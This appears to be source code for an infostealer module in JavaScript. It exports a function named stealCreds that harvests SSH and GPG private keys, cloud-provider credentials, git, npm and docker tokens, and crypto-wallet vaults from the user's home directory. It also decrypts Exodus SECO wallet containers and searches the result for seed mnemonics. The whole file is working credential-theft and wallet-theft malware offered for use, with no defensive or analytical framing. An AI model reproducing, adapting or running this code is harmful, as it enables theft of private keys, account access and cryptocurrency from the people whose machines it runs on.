'use strict';
/*
 * Credential stores + crypto wallet vaults.
 *
 * Reads well-known credential files from the home directory (SSH, GPG, cloud
 * providers, git/CI tokens, package managers) and copies crypto-wallet vault
 * files. Everything is a plain file read — no native deps, so it stays
 * pkg-compilable. Missing files are skipped; nothing throws.
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');

const HOME = os.homedir();

// Known credential file locations (relative to $HOME). Each is read as text
// when it exists and looks like text, else captured as hex.
const CRED_FILES = [
  // SSH
  '.ssh/id_rsa', '.ssh/id_ed25519', '.ssh/id_ecdsa', '.ssh/id_dsa',
  '.ssh/id_rsa.pub', '.ssh/id_ed25519.pub', '.ssh/known_hosts',
  '.ssh/config', '.ssh/authorized_keys',
  // GPG
  '.gnupg/secring.gpg', '.gnupg/pubring.gpg',
  // Cloud providers
  '.aws/credentials', '.aws/config',
  '.config/gcloud/application_default_credentials.json', '.config/gcloud/access_tokens',
  '.azure/azureProfile.json',
  // Git / GitHub
  '.git-credentials', '.config/gh/hosts.yml', '.config/gh/config.yml', '.netrc',
  // Package managers / CI
  '.npmrc', '.pypirc', '.cargo/credentials', '.docker/config.json',
  '.netrc', '.hgrc',
];

// Crypto wallet vault locations (relative to $HOME). Captured as raw files so
// the encrypted vault + any plaintext seed/mnemonic are all preserved.
const WALLET_FILES = [
  '.bitcoin/wallet.dat', '.bitcoin/keys.conf',
  '.config/MetaMask/vault', '.config/MetaMask/Keychain',
  '.config/phantom/vault',
  '.local/share/MetaMask/wallet_v3',
];
const WALLET_DIRS = [
  'Library/Application Support/Exodus/exodus.wallet',
  'Library/Application Support/Exodus',
  'Library/Application Support/MetaMask',
  'Library/Application Support/Phantom',
  'Library/Application Support/ExodusWallet',
  'Library/Application Support/BraveSoftware/Brave-Browser/Extensions',
];

function readTextSafe(p) {
  try {
    if (!fs.existsSync(p)) return null;
    const buf = fs.readFileSync(p);
    // Heuristic: mostly printable => text, else hex.
    const sample = buf.slice(0, 512);
    let printable = 0;
    for (const b of sample) if (b >= 0x20 && b <= 0x7e) printable++;
    const isText = sample.length === 0 || printable / sample.length > 0.85;
    return isText ? buf.toString('utf8') : buf.toString('hex');
  } catch (e) {
    return null;
  }
}

function listDirFiles(dir, { max = 200, filter } = {}) {
  const out = [];
  let entries;
  try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch (e) { return out; }
  for (const ent of entries) {
    if (out.length >= max) break;
    if (!ent.isFile()) continue;
    if (filter && !filter(ent.name)) continue;
    out.push({ name: ent.name, size: safeSize(path.join(dir, ent.name)) });
  }
  return out;
}

function safeSize(p) { try { return fs.statSync(p).size; } catch (e) { return 0; } }

// Decrypt an Exodus SECO v0 ("seco-v0-scrypt-aes") vault if the passphrase is
// known. Verified against the ExodusOSS/hydra secure-container source and a real
// seed.seco (whose stored SHA-256 checksum matches our parse).
//
// File layout:
//   header   224 bytes  ("SECO" + version/reserved + versionTag/appName/appVersion)
//   checksum 32 bytes   SHA-256( metadata + UInt32BE(blobLen) + blob )
//   metadata 256 bytes:
//     scrypt:  salt(32) | n(u32be) | r(u32be) | p(u32be)
//     cipher:  32 bytes ("aes-256-gcm")
//     blobKey: iv(12) | authTag(16) | key(32)
//     blob:    iv(12) | authTag(16)
//   blob:     UInt32BE(len) | ciphertext(len)
//
// Decryption is two-stage AES-256-GCM:
//   derived  = scrypt(passphrase, salt, {N, r, p, dkLen:32})
//   blobKey  = AES-256-GCM-decrypt(derived, metadata.blobKey.key,
//                                    nonce=metadata.blobKey.iv, tag=metadata.blobKey.authTag)
//   plaintext= AES-256-GCM-decrypt(blobKey, blob, nonce=metadata.blob.iv,
//                                    tag=metadata.blob.authTag)
function tryDecryptExodusSeco(vaultBuf, passphrase) {
  if (!vaultBuf || !passphrase || vaultBuf.length < 516) return null;
  try {
    if (vaultBuf.slice(0, 4).toString('ascii') !== 'SECO') return null;
    const meta = 256;
    const salt = vaultBuf.slice(meta, meta + 32);
    const n = vaultBuf.readUInt32BE(meta + 32);
    const r = vaultBuf.readUInt32BE(meta + 36);
    const p = vaultBuf.readUInt32BE(meta + 40);
    const blobKeyIv = vaultBuf.slice(meta + 76, meta + 88);
    const blobKeyTag = vaultBuf.slice(meta + 88, meta + 104);
    const blobKeyKey = vaultBuf.slice(meta + 104, meta + 136);
    const blobIv = vaultBuf.slice(meta + 136, meta + 148);
    const blobTag = vaultBuf.slice(meta + 148, meta + 164);
    const blobLen = vaultBuf.readUInt32BE(512);
    const blob = vaultBuf.slice(516, 516 + blobLen);
    if (blob.length !== blobLen) return null;
    const gcmDec = (key, nonce, tag, data) => {
      const d = crypto.createDecipheriv('aes-256-gcm', key, nonce);
      d.setAuthTag(tag);
      return Buffer.concat([d.update(data), d.final()]);
    };
    const derived = crypto.scryptSync(passphrase, salt, 32, { N: n, r: r, p: p });
    const blobKey = gcmDec(derived, blobKeyIv, blobKeyTag, blobKeyKey);
    return gcmDec(blobKey, blobIv, blobTag, blob);
  } catch (e) {
    return null; // a GCM auth-tag mismatch (wrong passphrase) throws here
  }
}

// Heuristic BIP39 mnemonic finder: a run of 12-24 lowercase words (3-8 chars).
function findMnemonic(buf) {
  const s = buf.toString('utf8');
  const m = s.match(/\b[a-z]{3,8}(?: [a-z]{3,8}){11,23}\b/);
  return m ? m[0] : null;
}

function stealCreds() {
  const result = { files: {}, wallets: [] };

  // Known credential files.
  const seen = new Set();
  for (const rel of CRED_FILES) {
    if (seen.has(rel)) continue;
    seen.add(rel);
    const p = path.join(HOME, rel);
    const content = readTextSafe(p);
    if (content !== null) result.files[rel] = content;
  }

  // GPG private keys dir (many files).
  const gpgDir = path.join(HOME, '.gnupg', 'private-keys-v1.d');
  const gpgKeys = listDirFiles(gpgDir, { max: 50 });
  if (gpgKeys.length) {
    const out = {};
    for (const f of gpgKeys) {
      const c = readTextSafe(path.join(gpgDir, f.name));
      if (c !== null) out[f.name] = c;
    }
    if (Object.keys(out).length) result.files['.gnupg/private-keys-v1.d'] = out;
  }

  // Crypto wallets.
  for (const rel of WALLET_FILES) {
    const p = path.join(HOME, rel);
    const content = readTextSafe(p);
    if (content !== null) result.wallets.push({ path: rel, content });
  }
  for (const rel of WALLET_DIRS) {
    const dir = path.join(HOME, rel);
    if (!fs.existsSync(dir)) continue;
    const files = listDirFiles(dir, { max: 100 });
    if (!files.length) continue;
    const entry = { dir: rel, files: [] };
    for (const f of files) {
      const p = path.join(dir, f.name);
      // Capture small text files inline; record larger binary files by name.
      if (f.size < 256 * 1024) {
        const c = readTextSafe(p);
        if (c !== null) entry.files.push({ name: f.name, size: f.size, content: c });
      } else {
        entry.files.push({ name: f.name, size: f.size });
      }
    }
    // Attempt Exodus SECO decryption for every .seco file if a passphrase exists.
    const passFile = entry.files.find((f) => /passphrase\.json$/.test(f.name) && f.content);
    if (passFile) {
      let passphrase = null;
      try { passphrase = JSON.parse(passFile.content).passphrase; } catch (e) {}
      const decrypted = {};
      for (const f of entry.files) {
        if (!/\.seco$/.test(f.name) || !f.content) continue;
        const dec = tryDecryptExodusSeco(Buffer.from(f.content, 'hex'), passphrase);
        if (dec) {
          decrypted[f.name] = {
            size: dec.length,
            hex: dec.toString('hex'),
            mnemonic: findMnemonic(dec),
          };
        }
      }
      if (Object.keys(decrypted).length) entry.decrypted_seco = decrypted;
    }
    result.wallets.push(entry);
  }

  return result;
}

module.exports = { stealCreds };
